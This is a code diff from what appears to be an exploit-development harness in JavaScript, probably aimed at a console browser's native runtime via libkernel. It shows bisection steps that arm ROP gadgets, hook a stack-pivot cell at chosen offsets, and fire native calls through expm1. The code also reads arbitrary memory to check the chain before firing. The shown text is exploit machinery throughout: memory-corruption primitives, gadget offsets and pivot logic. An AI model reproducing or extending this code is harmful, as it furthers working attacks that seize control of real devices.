@@ -73,13 +73,14 @@ import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke,
     layoutSmokeStack, layoutGetpidStack, bisectArmG0, bisectHookPivot, bisectHookPivotPoops,
-    bisectFireExpm1, bisectFirePoopsStyle, bisectRestore, fireNativeCallBisect, verifyFullChainSet, verifyBisectChainSet, describeSlabLayout,
+    bisectFireExpm1, bisectFirePoopsStyle, bisectPreflight, G0_HOOK_OFFS,
+    bisectRestore, fireNativeCallBisect, verifyFullChainSet, verifyBisectChainSet, describeSlabLayout,
     patchPrepG5, verifySlabAddrs, probePivotCell, bisectHookPivotAt, bisectHookPivotMulti,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830ao";
+const BUILD_ID = "rw-20250830aq";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 smoke", title: "atomic layout+fire @ prep (chain_poops callAddr)" },
@@ -92,7 +93,8 @@ const NATIVE_BISECT_STEPS = [
     { id: "hook-multi", label: "N4m multi", title: "hook @ +0 +20 +28 +30 +38 at once" },
     { id: "expm1-lite", label: "N5a exp1", title: "expm1(1) G0 armed — OOM expected (no hook)" },
     { id: "expm1-nohook", label: "N5c obj", title: "expm1(pivotObj) G0 armed NO hook" },
-    { id: "expm1", label: "N5 expm1", title: "expm1(pivotObj) after N4 hook" },
+    { id: "expm1", label: "N5 expm1", title: "standalone: sync+layout+multi-hook+expm1 (no N2-N4)" },
+    { id: "expm1-h30", label: "N5h +30", title: "hook pivotCell+0x30 only (G0 [rsi+0x30])" },
     { id: "expm1-g5alt", label: "N5b G5alt", title: "G5=expm1+0x53642a then expm1 (after N3+N4)" },
     { id: "restore", label: "N6 restore", title: "restore pivot + main" },
     { id: "smoke-full", label: "N7 smoke", title: "layout + full fire (smoke)" },
@@ -4284,14 +4286,41 @@ function bisectFlushBeforeFire() {
     try { crashLog.flushSync(); } catch (_) { }
 }
 
-function bisectEnsureReadyForN5(p, off) {
-    bisectPrepSync(p, off, "pre-N5");
+function bisectLogHookPost(p, prep) {
+    if (!nativePrep || !nativePrep.pivotCell || !nativePrep.M) return;
+    const s = nativePrep.M.S;
+    const cell = nativePrep.pivotCell;
+    const peeks = [];
+    for (let i = 0; i < G0_HOOK_OFFS.length; i++) {
+        const o = G0_HOOK_OFFS[i];
+        let v = null;
+        try { v = p.read8(cell.add32(o)); } catch (_) { v = null; }
+        peeks.push("+0x" + o.toString(16) + "=" + v);
+    }
+    bisectLog("HOOK-POST", peeks.join(" ") + " want S=" + s);
+}
+
+function bisectRunPoopsFire(p, off, hookOffs, tag) {
+    bisectPrepSync(p, off, "pre-" + tag);
     layoutSmokeStack(nativePrep);
     bisectArmG0(p, nativePrep);
-    const site = nativePrep.pivotCell;
-    const peek0 = p.read8(site);
-    const peek30 = p.read8(site.add32(0x30));
-    bisectLog("HOOK-PRE", "+0=" + peek0 + " +0x30=" + peek30 + " (before hook, want S=" + nativePrep.M.S + ")");
+    const pf = bisectPreflight(p, nativePrep);
+    bisectLog("PRE-FLIGHT", "S=" + (pf.slab && pf.slab.S.ok)
+        + " K=" + (pf.slab && pf.slab.K.ok)
+        + " P=" + (pf.slab && pf.slab.P.ok)
+        + " rsp=" + (pf.slab && pf.slab.rsp ? pf.slab.rsp.ok : "?")
+        + " mainMf=" + nativePrep.mainMf
+        + " path=" + (nativePrep._cap && nativePrep._cap.path || "?"));
+    if (!pf.ok)
+        throw new Error("preflight: " + pf.reasons.join("; "));
+    bisectLog("ARM-CHK", "mainMf→" + pf.armed + " G0=" + pf.g0
+        + " pivotCell=" + nativePrep.pivotCell);
+    bisectSnapshot(p, nativePrep, off, "pre-" + tag);
+    bisectFlushBeforeFire();
+    bisectLog("BISECT-WARN", tag + " multi-hook poops fire…");
+    const pid = bisectFirePoopsStyle(p, nativePrep, hookOffs);
+    bisectLogHookPost(p, nativePrep);
+    return pid;
 }
 
 function requireNativePrep() {
@@ -4506,13 +4535,15 @@ function runNativeBisectStep(stepId) {
             break;
         case "expm1":
             requireNativePrep();
-            bisectEnsureReadyForN5(p, off);
-            bisectSnapshot(p, nativePrep, off, "pre-N5");
-            bisectFlushBeforeFire();
-            bisectLog("BISECT-WARN", "N5 poops callAddr (layout+hook+0+expm1) — firing…");
-            pid = bisectFirePoopsStyle(p, nativePrep);
+            pid = bisectRunPoopsFire(p, off, G0_HOOK_OFFS, "N5");
             bisectLog("BISECT-OK", "N5 expm1 survived frame=" + pid);
             state("N5 expm1 OK", "ok");
+            break;
+        case "expm1-h30":
+            requireNativePrep();
+            pid = bisectRunPoopsFire(p, off, [0x30], "N5h");
+            bisectLog("BISECT-OK", "N5h +0x30 survived frame=" + pid);
+            state("N5h OK", "ok");
             break;
         case "expm1-g5alt": {
             requireNativePrep();
